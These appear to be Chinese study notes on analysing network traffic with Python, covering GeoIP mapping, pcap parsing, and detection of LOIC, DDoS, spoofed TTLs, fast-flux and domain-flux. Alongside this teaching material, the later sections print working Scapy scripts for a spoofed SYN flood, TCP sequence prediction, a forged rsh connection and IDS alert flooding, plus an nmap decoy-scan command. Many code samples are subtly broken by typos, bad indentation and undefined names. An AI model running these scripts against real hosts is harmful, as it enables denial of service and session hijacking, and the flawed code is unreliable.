# 第 4 章 用 Python 分析网络流量

## IP 流量将何去何从？——用 Python 回答

把一个网际协议地址（IP 地址）和它所在的物理地址关联起来，可以用 MaxMind 公司提供的一个可以免费获取的开源数据库 GeoLiteCity。有了这个数据库，就可以把 IP 地址与对应的国家、邮政编码、国家名称以及常规经纬度坐标关联起来。

### 使用 PyGeoIP 关联 IP 地址和物理位置

Jennifer Ennis 编写了一个查询 GeoLiteCity 数据库的纯 Python 库——pygeoip。城市（city）、区域名称（`region_name`）、邮政编码（`postal_code`）、国名（`country_name`）、经纬度以及其他识别信息的记录

```python
import pygeoip
gi = pygeoip.GeoIP("/opt/GetIP/Geo.dat")
def print_record(target):
    rec = gi.recory_by_name(target)
    city = rec["city"]
    region = rec["region_name"]
    country = rec["country_name"]
    long = rec["longitude"]
    lat = rec["latitude"]
    print("[*] Target: {} Geo-located.".format(target))
    print("[+] {}, {}, {}".format(city, region, country))
    print("[+] Latitude: {}, Longitude: {}".format(lat, long))
target = "173.255.226.98"
print_record(target)
```

### 使用 Dpkt 解析包

Dpkt 允许逐个分析抓包文件里的各个数据包，并检查数据包中的每个协议层。也可以使用 pypcap 分析当前的实时流量。

```python
import dpkt
import socket
def print_pcap(pcap):
    for ts, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            dst = socket.inet_ntoa(ip.dst)
            print("[+] Src: {} --> Dst: {}".format(src, dst))
        except:
            pass
        
def main():
    f = open("geotest.pcap")
    pcap = dpkt.pcap.Reader(f)
    print_pcap(pcap)
```

### 使用 Python 画谷歌地图

谷歌地图能在一个专门的界面中显示出一个虚拟地球仪、地图和地理信息。虽然用的是专用的界面，但谷歌地图可以让你很方便地在地球仪上画出指定位置或轨迹。通过创建一个扩展名为 KML 的文本文件，用户可以把许多个地理位置标在谷歌地球上。KML 是有特定规定的 XML 结构。

写一个函数 `ret_KML` 接收一个 IP，并返回表示该 IP 地址对应物理地址的 KML 结构

```python
def ret_kml(ip):
    rec = gi.record_by_name(ip)
    try:
        longitude = rec["longitude"]
        latitude= rec["latitude"]
        kml = (
        	"<Placemark>\n"
            "<name>%s</name>\n"
            "<Point>\n"
            "<coordinates>%6f,%6f</coordinates>\n"
            "</Point>\n"
            "</Placemark>\n"
        ) % (ip, longitude, latitude)
        return kml
	except Exception as e:
        return ""
```

可能想要使用不同的图标来表示不同类型的网络流量，比如可以用源和目标 TCP 端口来区分不同的网络流量。可以查看谷歌 KML 文档。

## “匿名者” 真能匿名吗？分析 LOIC 流量

LOIC（Low Orbit Ion Cannon，低轨道离子炮）是一个分布式拒绝服务工具包。

LOIC 使用大量的 UDP 和 TCP 流量对目标进行拒绝服务式攻击。

LOIC 提供两种操作模式。在第一种模式下，用户可以输入目标的地址。在第二种被称为 HIVEMIND（蜂群）的模式下，用户将 LOIC 连接到一台 IRC 服务器上，在这台服务器上，用户可以提出攻击，连接在这台服务器上的 IRC 的用户就会自动对该目标进行攻击

### 使用 Dkpt 发现下载 LOIC 的行为 

编写一个 Python 脚本来解析 HTTP 流量，并检查其中有无通过 HTTP GET 获取压缩过的 LOIC 二进制可执行文件的情况。要做到这一点，需要再次使用 Dug Song 的 Dpkt 库。

```python
import dpkt
import socket

def find_download(pcap):
    for ts, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            tcp = ip.data
            http = dpkt.http.Request(tcp.data)
            if http.method == "GET":
                uri = http.uri.lower()
                if ".zip" in uri and "loic" in uri:
                    print("[!] {} Download LOIC.".format(src))
       except:
        pass
f = open()
pcap = dpkt.pcap.Reader(f)
find_download(pcap)
```

### 解析 Hive 服务器上的 IRC 命令

“匿名者” 成员需要登录到指定的 IRC 服务器上发出一条攻击指令，如 `!lazor targetip=66.211.169.66 message=test_test port=80 method=tcp wait=false random=true start`。任何把 LOIC 以 HIVEMIND 模式连上 IRC 服务器的“匿名者”成员都能立即开始攻击该目标。

在大多数情况下，IRC 服务器使用的是 TCP 6667 端口。发往 IRC 服务器的消息的目标 TCP 端口应该就是 6667。从 IRC 服务器那里发出消息的 TCP 源端口也应该是 6667。

```python
import dpkt
import socket
def find_hivemind(pcap):
    for ts, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            dst = socket.inet_ntoa(ip.dst)
            tcp = ip.data
            dport = tcp.dport
            sport = tcp.sport
            if dport == 6667:
                if "!lazor" in tcp.data.lower():
                    print("[!] DDoS Hivemind issued by: {}".format(src))
                    print("[+] Target CMD: {}".format(tcp.data))
            if sport == 6667:
                if "!lazor" in tcp.data.lower():
                    print("[!] DDoS Hivemind issued to: {}".format(src))
                    print("[+] Target CMD: {}".format(tcp.data))
		except:
            pass
```

### 实时监测 DDoS 攻击

若要识别攻击，需要设置一个不正常的数据包数量的阈值。如果某一用户发送某个地址的数据包的数量超过了这个阈值，就表明发生了我们需要把它视为攻击做进一步调查的事情。

```python
import dpkt
import socket
THRESH = 10000
def find_attack(pcap):
    pkt_count = {}
    for ts, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            dst = socket.inet_ntoa(ip.dst)
            tcp = ip.data
            dport = tcp.dport
            if dport == 80:
                stream = "{}:{}".format(src, dst)
            	if pkt_count.has_key(stream):
                    pkt_count[stream] = pkt_count[stream] + 1
                else:
                    pkt_count[stream] = 1
		except:
            pass
        
for stream in pkt_count:
    pkts_sent = pkt_count[stream]
    if pkt_sent > THRESH:
        src = stream.split(":")[0]
        dst = stream.split(":")[1]
        print("[+] {} attacked {} with {} pkts."format(src, dst, str(pkts_sent)))
```

## H.D.Moore 是如何解决五角大楼的麻烦的

一系列协调一致的老练的攻击：`CIO Institude bulletin on computer security, 1999`

检测出 Nmap 扫描十分容易，而且还可以查出攻击者的 IP 地址，并依次找出该 IP 的物理地址。但是，攻击者可以使用 nmap 的高级选项。他们扫描时在数据包中不必填入自己的地址，可以填入地球上其他许多不同地方的 IP 地址进行伪装扫描（decoy scan）

Moore 建议使用 TTL 字段分析所有来自 Nmap 扫描的数据包。IP 数据包的 TTL（time-to-live）字段可以用来确定在到达目的地之前数据包经过了几跳。每当一个数据包经过一个路由设备时，路由器会将 TTL 字段中的值减去一。Moore 意识到这是个确定扫描源的好方法。对每个被记录为 Nmap 扫描包的源地址来说，他都会发送一个 ICMP 数据包，去确定源地址和被扫描的机器之间隔了几跳。然后他就运用这些信息来辨认真正的扫描员。显然，只有来自真实的扫描源的包中的 TTL 正确的，伪造 IP 的包中的 TTL 值则应该是不正确的。Moore 将他的工具命名为 Nlog，因为它能记录 Nmap 扫描包中的许多信息。

### 理解 TTL 字段

IP 数据包的 TTL 字段。TTL 字段由 8 比特组成，可以有效记录 0 到 255 之间的值。当计算机发送一个 IP 数据包时，它将 TTL 字段设置为数据包在到达目的地址前所应经过的中继跳的上限值。数据包每经过一个路由设备，TTL 值就自减一。如果 TTL 值到了零，路由器就会丢弃该数据包，以防止无限路由循环。

当在 Nmap 1.6 中引入伪装扫描时，伪造数据包的 TTL 值既不是随机的，也不是经过精心计算的。正因为 TTL 值没有经过正确计算，Moore 才能够识别这些数据包。Nmap 运用以下算法随机化 TTL。该算法为平均约 48 个数据包生成一个随机的 TTL 值。用户也可以通过一个可选的参数把 TTL 设为一个固定值。

```c++
// 生存时间
if (ttl == -1){
  my_ttl = (get_random_uint() % 23) + 37;
} else {
  my_ttl = ttl;
}
```

在以伪装扫描模式运行 Nmap 时，使用 -D 参数后跟一个 IP 地址。此外，还可以用 `-ttl` 参数把 TTL 值固定为 13。

```shell
nmap 192.168.1.7 -D 8.8.8.8 -ttl 13
```

在目标主机 192.168.1.7 上，用 verbose 模式（-v）运行 tcpdump，禁用名称解析（-nn），并只显示与地址 `8.8.8.8` 相关的流量（`host 8.8.8.8`）。可以看到 nmap 成功地用假地址 `8.8.8.8` 发送了 TTL 值为 13 的伪造数据包。

### 用 scapy 解析 TTL 字段的值

```python
from scapy.all import *

def test_ttl(pkt):
    try:
        if pkt.haslayer(IP):
            ipsrc = pkt.getlayer(IP).src
            ttl = str(pkt.ttl)
            print("[+] Pkt Received From: {} with TTL: {}".format(ipsrc, ttl))
    except:
        pass
    
def main():
    sniff(prn=test_ttl, store=0)
```

Linux/Unix 系统通常把 TTL 的初始值设为 64，而 Windows 系统则把它设为 128。

需要把内网/私有 IP 地址（`10.0.0.0~10.255.255.255`、`172.16.0.0~172.31.255.255`，以及 `192.168.0.0` ~ `192.168.255.255`）的数据包全部去掉。要做到这一点，需要导入 IPy 库。为了避免 IPy 库中的 IP 类与 Scapy 库中的 IP 类冲突，把它重命名为 IPTEST 类。如果 `IPTEST(ipsrc).iptype()` 返回 `PRIVATE`，就忽略对该数据包的检查。

可能会收到来自同一个源地址的多个数据包，而我们又不想重复检查同一个源地址。如果之前从未见过这个源地址，则要构建一个目标 IP 地址为这个源地址的 IP 包，这个包应该是一个 ICMP 请求报，这样目标主机就会做出回应。一旦目标主机做出了响应，我们就把 TTL 值存储在一个用源 IP 地址作为索引的词典中。然后将实际收到的 TTL 与原始数据包中的 TTL 放在一起，判断它们的差值是否超过了一个阈值。走不同的路径到达目标主机的数据包所经过的路由设备的数量可能会有所差异，因此其 TTL 也可能不完全一样。但是，如果中继跳数的差超过了 5 跳，则可以推断该 TTL 是假的。

```python
from scapy.all import *
from IPy import IP as IPTEST
ttl_values = {}
THRESH = 5

def check_ttl(ipsrc, ttl):
    if IPTEST(ipsrc).iptype() == "PRIVATE":
        return
    if not ttl_values.has_key(ipsrc):
        pkt = sr1(IP(dst=ipsrc) / ICMP(), retry=0, timeout = 1, verbose=0)
        ttl_values[ipsrc] = pkt.ttl
	if abs(int(ttl) - int(ttl_values[ipsrc])) > THRESH:
        print("[!] Detected Possible Spoofed Packet From: {}".format(ipsrc))
        print("[!] TTL: {}, Actual TTL: {}".format(ttl, str(ttl_values[ipsrc])))
```

尽管 RFC 1700 中建议把默认的 TTL 值设为 64，但是自 MS Windows NT 4.0 起，微软 Windows 就已经把 TTL 的初始值设为 128 了。此外，其他一些类 UNIX 系统也会使用不同的 TTL 初始值，比如 Solaris 2.x 的默认 TTL 初始值就是 255。

## “风暴”（Storm） 的 fast-flux 和 Conficker 的 domain-flux

名为 `fast-flux` 的技术使用域名服务（DNS）记录隐藏指挥风暴僵尸网络的控制与命令信道。DNS 记录一般是用来将域名转换为 IP 地址的。当 DNS 服务器返回一个结果时，它会同时指定一个 TTL——告诉主机这个 IP 地址在多长的时间里肯定是有效的，因此在这段时间里无须再次解析该域名。

风暴僵尸网络背后的攻击者会非常频繁地改变用于指挥与控制服务器的 DNS 记录。事实上，他们使用了分布在 50 多个国家的 384 个网络供应商手上的 2000 台冗余服务器。攻击者频繁地且切换指挥与控制服务器的 IP 地址，并在 DNS 查询结果中返回一个很短的 TTL。这种快速变化 IP 地址的做法（fast-flux）使得别人很难找出僵尸网络的指挥与控制服务器。

Conficker 是迄今为止最成功的电脑蠕虫病毒，通过 Windows 服务消息块（Windows Service Message Block，SMB）协议中的一个漏洞传播。一旦被感染，有漏洞的机器便联络命令与控制服务器，以获得进一步的指令。然而，Conficker 每三个小时会使用 UTC 格式的当前日期和时间生成一批不同的域名。对 Conficker 的第三个版本来说，这意味着每三个小时生成 50000 个域名。攻击者只注册了这些域名中的很少一部分，让它们能映射成真正的 IP 地址。这使得拦截和阻止来自命令与控制服务器的流量变得十分困难。由于该技术是轮流使用域名的，所以研究人员便将其命名为 `domain-flux`

### 你的 DNS 知道一些不为你所知的吗？

用 tcpdump 检查 DNS 查询过程可以看到，客户端向 DNS 服务器发送了一次请求。具体地说，客户端生成了一个 `DNS Question Record（DNSQR）`，查询对应域名的 IPv4 地址。服务器响应了一个 `DNS Resource Record（DNSRR）`，给出了域名的 IP 地址。

### 使用 Scapy 解析 DNS 流量

在用 Scapy 检查这些 DNS 协议请求包时，要检查的字段在 DNSQR 和 DNSRR 包都存在。一个 DNSQR 包中含有查询的名称（qname）、查询的类型（qtype）和查询的类别（qclass）。服务器相应的一个对应的 DNSRR，其中含有资源记录名名称（rrname）、类型（type）、资源记录类别（rclass）和 TTL。

欧洲网络和信息安全机构（The European Network and Information Security Agency）提供了一个分析网络流量的极好资源，该机构提供一个可启动的 DVD ISO 镜像，其中还含有几个网络抓包文件和练习。其中练习 7 中演示了 `fast-flux` 行为的 pcap 包。

### 用 Scapy 找出 `fast-flux` 流量

写一个 Python 脚本，从 pcap 文件中读取数据，并把所有含 DNSRR 的数据包解析出来

```python
from scapy.all import *
dns_records = dict()

def handle_pkt(pkt):
    if pkt.haslayer(DNSRR):
        rrname = pkt.getlayer(DNSRR).rrname
        rdata = pkt.getlayer(DNSRR).rdata
        if dns_records.has_key(rrname):
            if rdata not in dns_records[rrname]:
                dns_records[rrname].append(rdata)
        else:
            dns_records[rrname] = list()
            dns_records[rrname].append(rdata)
            
def main():
    pkts = rdpcap("fast_flux.pcap")
    for pkt in pkts:
        handle_pkt(pkt)
    for item in dns_records:
        print("[+] {} has {} unique IPs.".format(item, len(dns_records[item])))
```

### 用 Scapy 找出 Domain Flux 流量

Conficker 使用的是 `domain-flux` 技术，我们需要寻找的就是那些对未知域名查询回复出错消息的服务器响应包。DNS 服务器是没法把大多数域名转换为真正的 IP 地址的，对这些域名，服务器回复一个出错了的消息。可以通过找出所有含域名出错的错误代码的 DNS 响应包的方式，实时地识别出 `domain-flux`

再次读取网络抓包文件，并逐一检查抓包文件中的各个数据包。只检查来自服务器 53 端口的数据包——这种包中含有资源记录。DNS 数据包中有一个 rcode 字段。当 rcode 等于 3 时，表示的是域名不存在。然后把域名打印在屏幕上，并更新所有未得到应答的域名请求的计数器。

```python
from scapy.all import *

def dns_qrtest(pkt):
    if pkt.haslayer(DNSRR) and pkt.getlayer(UDP).sport == 53:
        rcode = pkt.getlayer(DNS).rcode
        qname = pkt.getlayer(DNSQR).qname
        if rcode == 3:
            print("[!] Name request lookup failed: {}".format(qname))
            return True
        else:
            return False

def main():
    un_ans_reqs = 0
    pkts = rdpcap("domain_flux.pcap")
    for pkt in pkts:
        if dns_qrtest(pkt):
            un_ans_reqs = un_ans_reqs + 1
            print("[!] {} Total Unanswered Name Requests".format(un_ans_reqs))
```

## Kevin Mitnick 和 TCP 序列号预测

Mitnick 使用了一种劫持 TCP 会话的方法。这种技术被称为 TCP 序列号预测，这一技术利用的是原本设计用来区分各个独立的网络连接的 TCP 序列号的生成缺乏随机性这一缺陷。这一缺陷加上 IP 地址欺骗，使得 Mitnick 能够劫持家用电脑中的某个连接。

### 预测你自己的 TCP 序列号

Mitnick 攻击的机器与某台远程服务器之间有可信协议。远程服务器可以通过在 TCP 513 端口上运行的远程登录协议（rlogin）访问 Mitnick 被攻击的计算机。rlogin 并没有使用公钥/私钥协议或口令认证，而是使用了一种不太安全的认证方法——绑定源 IP 地址。

为了攻击电脑，Mitnick 必须做到以下 4 点：

（1）找到一个受信任的服务器

（2）使该服务器无法再做出响应

（3）伪造来自服务器的一个连接

（4）盲目伪造一个 TCP三次握手的适当说明

Mitnick 找到与个人电脑之间有可信协议的远程服务器后，需要使远程服务器不能再发出响应。如果远程服务器发现有人尝试使用服务器 IP 地址进行假连接，它将发送 TCP 重置（reset）数据包关闭连接。为了使服务器无法再做出响应，Mitnick 向服务器上的远程登录（rlogin）端口发出了许多 TCP SYN 数据包，即 SYN 泛洪攻击（SYN Flood），这种攻击将会填满服务器的连接队列，使之无法做出任何响应。

### 使用 Scapy 制造 SYN 泛洪攻击

用 Scapy 重新实现 SYN 泛洪攻击，只需要制造一些载有 TCP 协议层的 IP 数据包，让这些包里 TCP 源端口不断地自增一，而目的 TCP 端口总是为 513

```python
from scapy.all import *

def syn_flood(src, target):
    for sport in range(1024, 65535):
        ip_layer = IP(src=src, dst=target)
        tcp_layer = TCP(sport=sport, dport=513)
        pkt = ip_layer / tcp_layer
        send(pkt)
src = "10.1.1.2"
target = "192.168.1.3"
syn_flood(src, target)
```
### 计算 TCP 序列号

Mitnick 能够伪造一个 TCP 连接到目标。不过，这取决于他能够发送伪造 SYN 包的能力，接着被攻击的机器会返回一个 TCP SYN-ACK 包确认连接。为了完成连接，Mitnick 需要在 SYN-ACK 中正确地猜出 TCP 的序列号（因为他无法观察到），然后把猜到的正确的 TCP 序列号放在 ACK 包中发送回去。

在 Python 中重现这一过程，将发送一个 TCP SYN 包，然后等待 TCP SYN-ACK 包。收到之后，将从这个确认包中读出 TCP 序列号，并把它打印到屏幕上。编写的函数 `cal_tsn` 将接收目标 IP 地址这个参数，返回下一个 SYN-ACK 包的序列号（当前 SYN-ACK 包的序列号加上差值）

```python
from scapy.all import *
def cal_tsn(target):
    seq_num = 0
    pre_num = 0
    diff_seq = 0
    for x in range(1, 5):
        if pre_num != 0:
            pre_num = seq_num
        pkt = IP(dst=target) / TCP()
        ans = sr1(pkt, verbose=0)
        seq_num = ans.getlayer(TCP).seq
        diff_seq = seq_num - pre_num
        print("[+] TCP Seq Difference: {}".format(diff_seq))
	return seq_num + diff_seq

target = "192.168.1.106"
seq_num = cal_tsn(target)
print("[+] Next TCP Sequence Number to ACK is: {}".format(seq_num + 1))
```

### 伪造 TCP 连接

在 Python 中重现这一行为，将创建和发送两个数据包。首先，创建一个 TCP 源端口为 513，目标端口为 514，源 IP 地址为被假冒的服务器，目标 IP 地址为被攻击计算机的 SYN 包。接着，创建一个相同的 ACK 包，并把计算得到的序列号填入相应的字段中，最后把它发送出去

```python
from scapy.all import *

def spoof_conn(src, target, ack):
    ip_layer = IP(src=src, dst=target)
    tcp_layer = TCP(sport=513, dport=514)
    syn_pkt = ip_layer / tcp_layer
    send(syn_pkt)
    ip_layer = IP(src=src, dst=target)
    tcp_layer = TCP(sport=513, dport=514, ack=ack)
    ack_pkt = ip_layer / tcp_layer
    send(ack_pkt)

src = "10.1.1.2"
target = "192.168.1.106"
seq_num = 2024371201
spoof_conn(src, target, seq_num)
```

## 使用 Scapy 愚弄入侵检测系统

入侵检测系统（Intrusion DetectionSystem，IDS），基于网络的入侵检测系统（network-based intrusion detection system，NIDS）可以通过记录流经 IP 网络的数据包实时地分析流量。用已知的恶意特征码对数据包进行扫描，IDS 可以在攻击成功之前就向网络分析师发出警报。SNORT 这个 IDS 系统自带的许多不同规则，就使它能够识别出许多包括不同类型的踩点，漏洞利用已经拒绝服务攻击在内的真实环境中的攻击手段。检查其中一些规则配置文件中的内容，可以看到针对 TFN、tfn2k 和 Trin00 分布式拒绝服务攻击工具包的四个警报触发规则。

```shell
cat /etc/snort/rules/ddos.rules
```

第一条警报触发规则——DDoS TFN 探针（DDoS TFN Probe）

```python
from scapy.all import *
def ddos_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / ICMP(type=8,id=678) / Raw(load="1234")
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst) / ICMP(type=0) / Raw(load="AAAAAAAAA")
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst) / UDP(dport=31335) / Raw(load="PONG")
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst) / ICMP(type=0, id=456)
    send(pkt, iface=iface, count=count)
    
src = "1.3.3.7"
dst = "192.168.1.106"
iface = "eth0"
count = 1
ddos_test(src, dst, iface, count)
```

接着看 SNORT 的 `exploit.rules` 签名文件中更复杂的警报触发规则：

```python
def exploit_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00...")
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02...")
    send(pkt, iface=iface, count=count)
```

 最后，伪造一些踩点或扫描操作也挺不错的。查看 SNORT 中关于扫描的警报触发规则，找到两个可以生成对应数据包的警报触发规则。这两个规则检测的是：发往 UDP 协议上的某些特定端口的数据包的内容中有无特定的特征码，如果有，则触发警报。

以下生成了两个会触发 cybercop 扫描器和 Amanda 扫描器扫描报警的数据包：

```python
def scan_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=7) / Raw(load="cybercop")
    send(pkt)
    pkt = IP(src=src, dst=dst) / UDP(dport=10080) / Raw(load="Amanda")
    send(pkt, iface=iface, count=count)
```